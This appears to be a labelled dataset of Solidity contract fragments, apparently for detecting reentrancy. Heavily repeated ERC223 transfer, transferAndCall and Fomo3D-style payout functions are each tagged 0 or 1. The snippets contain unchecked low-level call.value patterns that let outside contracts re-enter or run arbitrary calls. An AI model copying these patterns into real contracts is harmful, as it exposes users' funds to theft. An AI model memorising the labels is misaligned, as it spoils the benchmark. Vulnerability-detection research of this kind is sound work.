function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
291 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
292 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
293 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
294 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
295 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
296 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
297 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
298 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
299 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
300 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
301 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
302 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
303 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
304 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
305 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
306 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
307 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
308 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
309 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
310 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
311 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
312 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
313 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
314 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
315 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
316 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
317 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
318 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
319 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
320 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
321 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
322 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
323 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
324 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
325 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
326 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
327 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
328 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
329 1123.sol
